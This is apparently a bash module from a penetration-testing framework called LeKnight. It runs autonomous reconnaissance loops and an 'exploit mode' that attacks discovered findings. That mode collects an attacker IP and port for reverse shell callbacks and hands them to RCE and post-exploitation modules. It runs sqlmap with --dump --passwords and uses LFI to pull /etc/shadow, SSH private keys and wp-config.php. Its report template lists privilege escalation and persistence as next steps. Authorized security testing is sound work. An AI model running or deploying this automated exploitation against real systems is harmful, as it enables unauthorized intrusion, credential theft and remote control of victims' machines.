#!/bin/bash

# autopilot.sh - Autonomous scanning workflow
# Intelligently scans targets without human intervention
# Analyzes results and makes decisions about next steps

# Load advanced 5-phase pipeline if available
if [ -f "$(dirname "${BASH_SOURCE[0]}")/autopilot_advanced.sh" ]; then
    source "$(dirname "${BASH_SOURCE[0]}")/autopilot_advanced.sh"
    log_debug "Advanced autopilot module loaded"
fi

# Parse scope and create initial targets
parse_scope_to_targets() {
    local project_id="$1"
    local scope="$2"

    log_info "Parsing project scope and creating targets..."

    # Parse each line of scope
    while IFS= read -r line; do
        # Skip empty lines
        [ -z "$line" ] && continue

        # Trim whitespace
        line=$(echo "$line" | xargs)

        # Check if target already exists
        local existing=$(sqlite3 "$DB_PATH" <<EOF
SELECT id FROM targets
WHERE project_id = $project_id
AND (hostname = '$line' OR ip = '$line')
LIMIT 1;
EOF
)

        if [ -z "$existing" ]; then
            log_info "Adding target from scope: $line"
            project_add_target "$project_id" "$line"
        else
            log_debug "Target already exists: $line"
        fi
    done <<< "$scope"
}

# Main autopilot function - fully autonomous mode
autopilot_start() {
    local project_id=$(get_current_project)

    if [ -z "$project_id" ]; then
        log_error "No project loaded. Create or load a project first"
        return 1
    fi

    log_section "AUTOPILOT MODE ACTIVATED"
    log_info "Autonomous reconnaissance and exploitation framework"
    log_warning "This will run continuously until all targets are scanned"
    echo

    # Get project scope
    local scope=$(sqlite3 "$DB_PATH" "SELECT scope FROM projects WHERE id = $project_id;")

    if [ -z "$scope" ]; then
        log_error "No scope defined for project. Add targets first"
        return 1
    fi

    # Confirm start
    echo -e "${BRIGHT_BLUE}Scope:${RESET}"
    echo "$scope"
    echo

    if ! confirm "Start autonomous scanning?" "y"; then
        log_info "Autopilot cancelled"
        return 0
    fi

    # Parse scope and create initial targets if none exist
    local existing_targets=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM targets WHERE project_id = $project_id;")
    if [ "$existing_targets" -eq 0 ]; then
        log_info "No targets found in database, creating from scope..."
        parse_scope_to_targets "$project_id" "$scope"
        echo
    fi

    # Start autopilot loop
    local autopilot_start_time=$(date +%s)
    local iteration=0
    local new_targets_found=true

    while [ "$new_targets_found" = true ]; do
        ((iteration++))

        log_section "AUTOPILOT ITERATION $iteration"

        # Get all unscanned targets
        log_debug "Checking for unscanned targets in project $project_id..."
        local targets=$(get_unscanned_targets "$project_id")

        log_debug "Found targets: $(echo "$targets" | wc -l) line(s)"

        if [ -z "$targets" ]; then
            log_info "No more targets to scan"
            log_debug "Breaking autopilot loop - all targets processed"
            new_targets_found=false
            break
        fi

        local target_count=$(echo "$targets" | wc -l)
        log_info "Found $target_count targets to scan"

        # Scan each target
        local processed=0
        local iteration_start_time=$(date +%s)

        while IFS='|' read -r target_id hostname ip port; do
            ((processed++))

            # Determine target identifier
            local target=""
            [ -n "$hostname" ] && target="$hostname"
            [ -z "$target" ] && [ -n "$ip" ] && target="$ip"

            if [ -z "$target" ]; then
                log_warning "Skipping target $target_id (no hostname or IP)"
                continue
            fi

            # Calculate and display progress
            local current_time=$(date +%s)
            local elapsed=$((current_time - iteration_start_time))
            local progress=$((processed * 100 / target_count))

            # Calculate ETA
            if [ "$processed" -gt 0 ] && [ "$elapsed" -gt 0 ]; then
                local avg_time_per_target=$((elapsed / processed))
                local remaining=$((target_count - processed))
                local eta_seconds=$((remaining * avg_time_per_target))
                local eta_minutes=$((eta_seconds / 60))
                local eta_display="${eta_minutes}m $((eta_seconds % 60))s"
            else
                local eta_display="calculating..."
            fi

            # Progress bar visualization
            local bar_length=30
            local filled=$((progress * bar_length / 100))
            local empty=$((bar_length - filled))
            local bar=""
            for ((i=0; i<filled; i++)); do bar="${bar}█"; done
            for ((i=0; i<empty; i++)); do bar="${bar}░"; done

            echo
            log_info "Progress: [${bar}] ${progress}%"
            log_info "Target [$processed/$target_count]: $target | ETA: $eta_display"

            # Analyze and scan target
            autopilot_scan_target "$project_id" "$target_id" "$target"

            # Mark target as scanned
            mark_target_scanned "$target_id"

            # Small delay to be polite
            sleep 2
        done < <(echo "$targets")

        # Check if new targets were discovered
        local new_target_count=$(count_unscanned_targets "$project_id")
        log_debug "Unscanned targets remaining: $new_target_count"

        if [ "$new_target_count" -eq 0 ]; then
            log_debug "No new targets found, ending autopilot"
            new_targets_found=false
        else
            log_info "Discovered $new_target_count new targets, starting new iteration"
            log_debug "Waiting 5 seconds before next iteration..."
            sleep 5
        fi
    done

    # Autopilot complete
    local autopilot_end_time=$(date +%s)
    local total_duration=$((autopilot_end_time - autopilot_start_time))

    log_section "AUTOPILOT COMPLETED"
    echo -e "${BRIGHT_BLUE}Iterations:${RESET} $iteration"
    echo -e "${BRIGHT_BLUE}Total Duration:${RESET} ${total_duration}s"
    echo

    # Generate final report
    autopilot_summary "$project_id"

    log_success "Autopilot mission complete"
}

# Scan a single target intelligently
autopilot_scan_target() {
    local project_id="$1"
    local target_id="$2"
    local target="$3"

    # Use advanced 5-phase pipeline if enabled and available
    if [ "${LEKNIGHT_ADVANCED_MODE:-true}" = "true" ] && type autopilot_scan_target_advanced &>/dev/null; then
        log_debug "Using advanced 5-phase security testing pipeline"
        autopilot_scan_target_advanced "$project_id" "$target_id" "$target"
        return $?
    fi

    # Fallback to standard scanning
    log_info "Analyzing target type: $target"
    log_debug "Target ID: $target_id, Project ID: $project_id"

    # Determine target type and appropriate workflow
    if is_valid_ip "$target"; then
        log_debug "Target identified as IP address"
        autopilot_scan_ip "$project_id" "$target_id" "$target"

    elif is_valid_domain "$target"; then
        log_debug "Target identified as domain"
        autopilot_scan_domain "$project_id" "$target_id" "$target"

    elif is_valid_url "$target"; then
        log_debug "Target identified as URL"
        autopilot_scan_url "$project_id" "$target_id" "$target"

    else
        log_warning "Unknown target type, attempting generic scan"
        log_debug "Running fallback nmap scan on $target"
        run_tool "nmap" "$target"
    fi

    log_debug "Completed scan for target: $target"
}

# Scan IP address
autopilot_scan_ip() {
    local project_id="$1"
    local target_id="$2"
    local ip="$3"

    log_info "Target identified as IP address"

    # Step 1: Quick port scan
    log_info "Running quick port scan..."
    run_tool "nmap" "$ip" "-F"

    # Step 2: Analyze open ports and make decisions
    local open_ports=$(sqlite3 "$DB_PATH" <<EOF
SELECT DISTINCT port FROM findings
WHERE target_id = $target_id
AND type = 'open-port'
AND project_id = $project_id;
EOF
)

    if [ -z "$open_ports" ]; then
        log_info "No open ports found, skipping further enumeration"
        return 0
    fi

    log_info "Open ports detected, running targeted scans"

    # Check for web services
    if echo "$open_ports" | grep -qE "^(80|443|8080|8443)$"; then
        log_info "Web services detected"

        # Determine protocol
        local protocol="http"
        echo "$open_ports" | grep -qE "^(443|8443)$" && protocol="https"

        # Get actual port
        local web_port=$(echo "$open_ports" | grep -E "^(80|443|8080|8443)$" | head -1)

        local web_url="${protocol}://${ip}:${web_port}"

        # Run web reconnaissance
        workflow_web_quick "$web_url"
    fi

    # Check for SMB
    if echo "$open_ports" | grep -qE "^(139|445)$"; then
        log_info "SMB services detected"
        run_tool "enum4linux" "$ip" "-a" 2>/dev/null || log_debug "enum4linux not available"
    fi

    # Check for SSH
    if echo "$open_ports" | grep -qE "^22$"; then
        log_info "SSH service detected"
        run_tool "nmap" "$ip" "-p22 --script ssh-*"
    fi

    # Check for FTP
    if echo "$open_ports" | grep -qE "^21$"; then
        log_info "FTP service detected"
        run_tool "nmap" "$ip" "-p21 --script ftp-*"
    fi

    # Check for databases
    if echo "$open_ports" | grep -qE "^(1433|3306|5432|27017)$"; then
        log_info "Database services detected"
        run_tool "nmap" "$ip" "-sV -p1433,3306,5432,27017"
    fi

    log_success "IP scan completed"
}

# Scan domain
autopilot_scan_domain() {
    local project_id="$1"
    local target_id="$2"
    local domain="$3"

    log_info "Target identified as domain name"

    # Step 1: Subdomain enumeration
    log_info "Enumerating subdomains..."
    run_tool "subfinder" "$domain" "-silent"

    # Give parsers time to add subdomains to database
    sleep 2

    # Step 2: Web reconnaissance on main domain
    log_info "Scanning main domain..."
    local protocol=$(smart_detect_protocol "$domain")
    log_info "Using protocol: $protocol"
    workflow_web_quick "${protocol}://${domain}"

    # Step 3: DNS enumeration
    log_info "DNS enumeration..."
    run_tool "dnsenum" "$domain" 2>/dev/null || log_debug "dnsenum not available"

    # Step 4: Scan discovered subdomains (limited to prevent infinite loop)
    local subdomain_count=$(sqlite3 "$DB_PATH" <<EOF
SELECT COUNT(*) FROM targets
WHERE project_id = $project_id
AND tags LIKE '%subdomain%'
AND hostname LIKE '%$domain';
EOF
)

    if [ "$subdomain_count" -gt 0 ]; then
        log_info "Found $subdomain_count subdomains, scanning first 10..."

        local subdomains=$(sqlite3 "$DB_PATH" <<EOF
SELECT hostname FROM targets
WHERE project_id = $project_id
AND tags LIKE '%subdomain%'
AND hostname LIKE '%$domain'
LIMIT 10;
EOF
)

        echo "$subdomains" | while read -r subdomain; do
            log_info "Quick scan: $subdomain"
            local sub_protocol=$(smart_detect_protocol "$subdomain")
            log_info "Using protocol: $sub_protocol for $subdomain"
            workflow_web_quick "${sub_protocol}://${subdomain}"
            sleep 2
        done
    fi

    log_success "Domain scan completed"
}

# Scan URL
autopilot_scan_url() {
    local project_id="$1"
    local target_id="$2"
    local url="$3"

    log_info "Target identified as URL"

    # Run web reconnaissance workflow
    workflow_web_medium "$url"

    log_success "URL scan completed"
}

# Get unscanned targets
get_unscanned_targets() {
    local project_id="$1"

    # Get targets that haven't been scanned yet by autopilot
    sqlite3 "$DB_PATH" <<EOF
SELECT t.id, t.hostname, t.ip, t.port
FROM targets t
WHERE t.project_id = $project_id
AND (t.autopilot_status IS NULL OR t.autopilot_status = 'pending')
ORDER BY t.created_at ASC;
EOF
}

# Count unscanned targets
count_unscanned_targets() {
    local project_id="$1"

    sqlite3 "$DB_PATH" <<EOF
SELECT COUNT(*)
FROM targets t
WHERE t.project_id = $project_id
AND (t.autopilot_status IS NULL OR t.autopilot_status = 'pending');
EOF
}

# Mark target as scanned (add a marker scan)
mark_target_scanned() {
    local target_id="$1"

    sqlite3 "$DB_PATH" <<EOF
UPDATE targets
SET autopilot_status = 'completed',
    autopilot_completed_at = CURRENT_TIMESTAMP
WHERE id = $target_id;
EOF

    log_debug "Target $target_id marked as scanned by autopilot"
}

# Autopilot summary report
autopilot_summary() {
    local project_id="$1"

    log_section "AUTOPILOT SUMMARY"

    # Get statistics
    local total_targets=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM targets WHERE project_id = $project_id;")
    local total_scans=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM scans WHERE project_id = $project_id;")
    local total_findings=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM findings WHERE project_id = $project_id;")
    local total_credentials=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM credentials WHERE project_id = $project_id;")

    echo -e "${BRIGHT_BLUE}Targets Discovered:${RESET} $total_targets"
    echo -e "${BRIGHT_BLUE}Scans Executed:${RESET} $total_scans"
    echo -e "${BRIGHT_BLUE}Findings:${RESET} $total_findings"
    echo -e "${BRIGHT_BLUE}Credentials:${RESET} $total_credentials"
    echo

    # Findings by severity
    echo -e "${BRIGHT_BLUE}Findings by Severity:${RESET}"
    db_finding_stats "$project_id"
    echo

    # Top findings
    echo -e "${BRIGHT_BLUE}Top Critical/High Findings:${RESET}"
    sqlite3 -column "$DB_PATH" <<EOF
SELECT severity, title, created_at
FROM findings
WHERE project_id = $project_id
AND severity IN ('critical', 'high')
ORDER BY
    CASE severity
        WHEN 'critical' THEN 1
        WHEN 'high' THEN 2
    END,
    created_at DESC
LIMIT 10;
EOF
    echo

    # Discovered credentials
    if [ "$total_credentials" -gt 0 ]; then
        echo -e "${BRIGHT_BLUE}Discovered Credentials:${RESET}"
        sqlite3 -column "$DB_PATH" <<EOF
SELECT username, service, source
FROM credentials
WHERE project_id = $project_id
LIMIT 10;
EOF
        echo
    fi

    log_info "Full report available with: leknight report generate"
}

# Continuous monitoring mode
autopilot_monitor() {
    local project_id=$(get_current_project)

    if [ -z "$project_id" ]; then
        log_error "No project loaded"
        return 1
    fi

    local interval="${1:-3600}"  # Default: 1 hour

    log_section "AUTOPILOT MONITORING MODE"
    log_info "Scanning interval: ${interval}s"
    log_warning "Press Ctrl+C to stop"
    echo

    while true; do
        log_info "Starting monitoring scan at $(date)"

        # Run autopilot
        autopilot_start

        # Wait for next interval
        log_info "Next scan in ${interval}s"
        sleep "$interval"
    done
}

# Smart rescan - rescan targets with high-severity findings
autopilot_rescan_high_value() {
    local project_id=$(get_current_project)

    if [ -z "$project_id" ]; then
        log_error "No project loaded"
        return 1
    fi

    log_section "RESCANNING HIGH-VALUE TARGETS"

    # Get targets with critical/high findings
    local high_value_targets=$(sqlite3 "$DB_PATH" <<EOF
SELECT DISTINCT t.id, t.hostname, t.ip
FROM targets t
JOIN findings f ON f.target_id = t.id
WHERE t.project_id = $project_id
AND f.severity IN ('critical', 'high')
ORDER BY f.severity;
EOF
)

    if [ -z "$high_value_targets" ]; then
        log_info "No high-value targets found"
        return 0
    fi

    echo "$high_value_targets" | while IFS='|' read -r target_id hostname ip; do
        local target=""
        [ -n "$hostname" ] && target="$hostname"
        [ -z "$target" ] && [ -n "$ip" ] && target="$ip"

        log_info "Rescanning high-value target: $target"
        autopilot_scan_target "$project_id" "$target_id" "$target"

        sleep 5
    done

    log_success "High-value targets rescanned"
}

# Exploit mode - attempt to exploit discovered vulnerabilities
autopilot_exploit_mode() {
    local project_id=$(get_current_project)

    if [ -z "$project_id" ]; then
        log_error "No project loaded"
        return 1
    fi

    log_section "AUTOPILOT EXPLOIT MODE"
    log_warning "This will attempt to EXPLOIT discovered vulnerabilities"
    log_warning "This includes REVERSE SHELLS and POST-EXPLOITATION"
    log_warning "Ensure you have EXPLICIT AUTHORIZATION before proceeding!"
    log_warning "All exploitation attempts will be logged for audit trail"
    echo

    if ! confirm "Proceed with exploitation attempts?" "n"; then
        log_info "Exploit mode cancelled"
        return 0
    fi

    # Get attacker IP for reverse shells
    log_info "Enter your IP address for reverse shell callbacks:"
    read -r attacker_ip
    log_info "Enter port for reverse shell listener (default: 4444):"
    read -r attacker_port
    attacker_port=${attacker_port:-4444}

    log_info "Attacker IP: $attacker_ip"
    log_info "Listener Port: $attacker_port"

    if ! confirm "Confirm these settings?" "n"; then
        log_info "Exploit mode cancelled"
        return 0
    fi

    # Load exploitation modules
    local exploit_modules_dir="$(dirname "${BASH_SOURCE[0]}")/../modules/exploitation"
    if [ -f "${exploit_modules_dir}/rce_exploit.sh" ]; then
        source "${exploit_modules_dir}/rce_exploit.sh"
        log_debug "Loaded RCE exploitation module"
    fi
    if [ -f "${exploit_modules_dir}/post_exploit.sh" ]; then
        source "${exploit_modules_dir}/post_exploit.sh"
        log_debug "Loaded post-exploitation module"
    fi

    # Get exploitable findings
    local exploitable=$(sqlite3 "$DB_PATH" <<EOF
SELECT f.id, f.type, f.title, f.description, t.hostname, t.ip, t.port
FROM findings f
JOIN targets t ON t.id = f.target_id
WHERE f.project_id = $project_id
AND f.severity IN ('critical', 'high')
AND f.type IN ('sqli_error_based', 'sqli_boolean_blind', 'sqli_time_blind', 'sqli_union_based',
               'rce_command_injection', 'rce_command_injection_output', 'rce_code_injection',
               'rce_ssti', 'rce_file_disclosure', 'lfi_confirmed', 'file-upload')
ORDER BY
    CASE f.type
        WHEN 'rce_command_injection' THEN 1
        WHEN 'rce_command_injection_output' THEN 1
        WHEN 'rce_code_injection' THEN 2
        WHEN 'rce_ssti' THEN 3
        WHEN 'sqli_error_based' THEN 4
        WHEN 'sqli_union_based' THEN 5
        ELSE 6
    END;
EOF
)

    if [ -z "$exploitable" ]; then
        log_info "No exploitable findings found"
        return 0
    fi

    local total_findings=$(echo "$exploitable" | wc -l)
    local current=0
    local exploited=0

    echo "$exploitable" | while IFS='|' read -r finding_id vuln_type title description hostname ip port; do
        current=$((current + 1))

        log_section "Exploiting Finding $current/$total_findings"
        log_info "ID: $finding_id"
        log_info "Type: $vuln_type"
        log_info "Title: $title"
        echo

        # Build target URL
        local target=""
        if [ -n "$hostname" ]; then
            if [ -n "$port" ] && [ "$port" != "80" ] && [ "$port" != "443" ]; then
                target="${hostname}:${port}"
            else
                target="$hostname"
            fi
        elif [ -n "$ip" ]; then
            if [ -n "$port" ]; then
                target="${ip}:${port}"
            else
                target="$ip"
            fi
        fi

        # Add protocol
        if [ "$port" = "443" ]; then
            target="https://$target"
        else
            target="http://$target"
        fi

        # Extract parameter from description
        local parameter=$(echo "$description" | grep -oP 'Parameter:\s*\K\S+' | head -1)
        local url=$(echo "$description" | grep -oP 'URL:\s*\K\S+' | head -1)

        [ -z "$url" ] && url="$target"

        log_info "Target URL: $url"
        log_info "Parameter: $parameter"

        # Attempt exploitation based on vulnerability type
        case "$vuln_type" in
            sqli_*|sql-injection)
                log_info "[Exploit] Launching SQLMap for SQL injection exploitation"

                # Run SQLMap with aggressive options
                local sqlmap_output="data/projects/${project_id}/exploits/sqlmap_${finding_id}"
                mkdir -p "$sqlmap_output"

                if command -v sqlmap &> /dev/null; then
                    sqlmap -u "$url" \
                           --batch \
                           --level=5 \
                           --risk=3 \
                           --technique=BEUSTQ \
                           --dbms=all \
                           --threads=5 \
                           --random-agent \
                           --output-dir="$sqlmap_output" \
                           --dump \
                           --passwords \
                           2>&1 | tee "${sqlmap_output}/sqlmap.log"

                    log_success "[Exploit] SQLMap completed. Check: $sqlmap_output"
                    exploited=$((exploited + 1))
                else
                    log_warn "[Exploit] SQLMap not installed"
                fi
                ;;

            rce_*|command-injection|rce)
                log_critical "[Exploit] Attempting RCE exploitation with reverse shells"

                if [ -n "$parameter" ]; then
                    # Call RCE exploitation module
                    if exploit_rce "$finding_id" "$url" "$parameter" "$project_id" "$attacker_ip" "$attacker_port"; then
                        log_critical "[Exploit] RCE exploitation successful!"

                        # Proceed to post-exploitation
                        log_info "[Exploit] Starting post-exploitation phase..."

                        if confirm "Run post-exploitation enumeration?" "y"; then
                            post_exploit "$url" "$parameter" "$project_id"
                            log_success "[Exploit] Post-exploitation completed"
                        fi

                        exploited=$((exploited + 1))
                    else
                        log_warn "[Exploit] RCE exploitation failed"
                    fi
                else
                    log_warn "[Exploit] No parameter found for RCE exploitation"
                fi
                ;;

            lfi_confirmed|lfi)
                log_info "[Exploit] LFI exploitation - attempting to read sensitive files"

                if [ -n "$parameter" ]; then
                    local lfi_output="data/projects/${project_id}/exploits/lfi_${finding_id}"
                    mkdir -p "$lfi_output"

                    # Try to read sensitive files
                    local sensitive_files=(
                        "/etc/passwd"
                        "/etc/shadow"
                        "/etc/hosts"
                        "/etc/apache2/apache2.conf"
                        "/var/www/html/wp-config.php"
                        "/home/user/.ssh/id_rsa"
                        "/root/.ssh/id_rsa"
                    )

                    for file in "${sensitive_files[@]}"; do
                        log_info "[Exploit] Reading: $file"

                        # Build LFI URL
                        local lfi_url
                        if [[ "$url" == *"?"* ]]; then
                            lfi_url="${url}&${parameter}=${file}"
                        else
                            lfi_url="${url}?${parameter}=${file}"
                        fi

                        local response=$(curl -s -L --max-time 10 "$lfi_url")

                        # Save if we got content
                        if [ -n "$response" ] && [ ${#response} -gt 50 ]; then
                            local filename=$(echo "$file" | tr '/' '_')
                            echo "$response" > "${lfi_output}/${filename}.txt"
                            log_success "[Exploit] Saved: ${filename}.txt"
                        fi
                    done

                    log_success "[Exploit] LFI exploitation completed. Check: $lfi_output"
                    exploited=$((exploited + 1))
                else
                    log_warn "[Exploit] No parameter found for LFI exploitation"
                fi
                ;;

            file-upload)
                log_info "[Exploit] File upload exploitation - attempting web shell upload"
                log_warn "[Exploit] Manual intervention required for file upload exploitation"
                # This would require detecting the upload form and submitting a shell
                # Too complex for full automation, but we can provide guidance
                ;;

            *)
                log_info "[Exploit] No automated exploit available for $vuln_type"
                ;;
        esac

        sleep 3
        echo
    done

    log_section "EXPLOITATION SUMMARY"
    log_info "Total findings attempted: $total_findings"
    log_success "Successfully exploited: $exploited"
    log_success "Exploitation completed"

    # Generate exploitation report
    generate_exploitation_report "$project_id"
}

# Generate exploitation report
generate_exploitation_report() {
    local project_id=$1

    local exploit_dir="data/projects/${project_id}/exploits"
    local report_file="${exploit_dir}/exploitation_report.md"

    mkdir -p "$exploit_dir"

    cat > "$report_file" <<EOF
# Exploitation Report
**Generated:** $(date)
**Project ID:** $project_id

## Summary

This report documents all exploitation attempts performed by LeKnight autopilot exploit mode.

## Exploitation Results

### SQL Injection Exploits
$(ls -1 "${exploit_dir}"/sqlmap_* 2>/dev/null | while read -r dir; do
    echo "- $(basename "$dir")"
    [ -f "$dir/sqlmap.log" ] && echo "  - Log: $dir/sqlmap.log"
done)

### RCE Exploits
$(ls -1d "${exploit_dir}"/rce_* 2>/dev/null | while read -r dir; do
    echo "- $(basename "$dir")"
    [ -f "$dir/bash_exploit_success.txt" ] && echo "  - Bash shell: SUCCESS"
    [ -f "$dir/python_exploit_success.txt" ] && echo "  - Python shell: SUCCESS"
done)

### Post-Exploitation
$(ls -1 "data/projects/${project_id}/exploitation/post_exploit/report.txt" 2>/dev/null | while read -r file; do
    echo "- Post-exploitation report available"
done)

## Files Generated

\`\`\`
$(find "$exploit_dir" -type f 2>/dev/null)
\`\`\`

## Next Steps

1. Review all harvested credentials
2. Attempt privilege escalation on compromised systems
3. Establish persistent access (if authorized)
4. Document all findings for client report

**WARNING:** All exploitation was performed under authorization. Maintain audit trail.
EOF

    log_success "Exploitation report generated: $report_file"
}
